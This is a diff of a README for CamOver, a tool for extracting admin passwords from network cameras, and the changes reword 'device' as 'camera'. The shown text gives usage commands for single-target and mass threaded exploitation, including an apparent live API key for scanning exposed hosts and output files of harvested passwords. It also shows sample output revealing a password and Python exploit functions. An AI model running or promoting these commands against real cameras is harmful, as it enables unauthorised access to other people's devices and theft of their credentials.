@@ -47,8 +47,8 @@ camover -a 192.168.99.100
 **output:**
 
 ```shell
-[*] (192.168.99.100) - connecting to device...
-[*] (192.168.99.100) - accessing device rom...
+[*] (192.168.99.100) - connecting to camera...
+[*] (192.168.99.100) - accessing camera config...
 [*] (192.168.99.100) - extracting admin password...
 [i] (192.168.99.100) - password: mamahacker123
 ```
@@ -85,7 +85,7 @@ camover -t --api PSKINdQe1GyxGgecYz2191H2JoS9qvgD -o passwords.txt
 [i] Thread #2 completed.
 ```
 
-Let's try to use opened database of hosts with `-t` for fast exploitation.
+Let's try to use opened database of cameras with `-t` for fast exploitation.
 
 ```shell
 camover -t -i cameras.txt -o passwords.txt
@@ -125,10 +125,10 @@ from camover import CamOver
 
 ### Basic functions
 
-There are all CamOver basic functions that can be used to exploit specified device.
+There are all CamOver basic functions that can be used to exploit specified camera.
 
-* `connect(host)` - Connect specified defice by network address.
-* `exploit(device)` - Exploit connected device.
+* `connect(host)` - Connect specified camera by network address.
+* `exploit(camera)` - Exploit connected camera.
 
 ### Examples
 
